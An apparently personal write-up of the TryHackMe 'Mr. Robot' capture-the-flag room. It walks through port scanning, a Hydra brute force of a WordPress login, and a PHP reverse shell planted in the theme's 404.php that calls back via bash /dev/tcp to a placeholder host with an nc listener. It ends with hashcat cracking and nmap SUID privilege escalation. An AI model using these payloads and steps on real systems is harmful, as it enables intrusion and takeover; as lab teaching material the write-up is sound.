# Mr. Robot CTF Walkthrough (TryHackMe)

## Overview

This write-up documents my approach to completing the Mr. Robot CTF room on TryHackMe. It’s a beginner-to-intermediate challenge focused on enumeration, password cracking, and privilege escalation — all wrapped in a Mr. Robot-themed environment.

---

## 1. Reconnaissance

**Target IP:** `10.10.X.X` (your room's IP)

We begin by scanning for open ports:

```bash
nmap -sS -sV...
```
**Results:**

Port 80 (HTTP) — Apache running ect...

## Step 2: Explore Web Content

Visit the web server via browser:
```bash
http://<target_ip>

Check the robots.txt file:

http://<target_ip>/robots.txt
```
**Findings:**

fsocity.dic — a large dictionary file

key-1-of-3.txt — First flag

## Step 3: Discover Login Portal

Using browser or tools like dirb, enumerate hidden paths.

**Find WordPress Login:**

http://<target_ip>/wp-login.php

## Step 4: Brute Force WordPress Login (Hydra)

Use hydra with the fsocity.dic as username and password list.

hydra -L fsocity.dic -P fsocity.dic <target_ip> http-post-form...

Found a valid username and a working password.

## Step 5: Get Admin Access to WordPress

Log in to WordPress admin:

http://<target_ip>/wp-login.php

Navigate to:
Appearance > Theme Editor > 404.php

## Step 6: Inject Reverse Shell

Insert a basic PHP reverse shell into 404.php. When accessed via browser, it will call back to your listener.

Payload example (obfuscated):

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"); ?>

Start listener on your machine:

nc -lvnp YOUR_PORT

Then visit:

http://<target_ip>/404.php

### Step 7: Privilege Escalation - Get Second Flag

You’re now inside the system as a non-privileged account.

Check /home/robot/key-2-of-3.txt and determined can't access file as non-privileged account by seeing blank page when trying to access it.
You’ll need to become robot the root user to access the protected file.

Also, find password.raw-md5.

Cracked md5 file using hashcat to retrieve robot's password.

Then escalated to the privileged root user:

su robot

## Step 8: Root Access - Capture Final Flag

Now as robot, escalate privileges. Check for unusual binaries with SUID permission:

find / -perm -4000 2>/dev/null

Find that nmap has SUID bit set meaning the nmap program can be run with root powers, even by a normal user.

Launch interactive shell using legacy nmap mode:

nmap --interactive...

Now you are root. Grab the final flag:

cat /root...

## Completion

The box has been successfully rooted.

## Summary

**This lab demonstrated:**

Wordlist-based brute forcing

WordPress exploitation

Shell injection through editable templates

Basic privilege escalation

Safe post-exploitation practices

Educational Use Only — do not apply these techniques outside of a legal, authorized environment.

## ⚠️ **EDUCATIONAL USE ONLY**

> This project is for **educational and ethical hacking purposes only**.  
> Do **NOT** use these techniques on any systems you do not own or have explicit permission to test.  
> Unauthorized hacking is **illegal** and punishable by law.
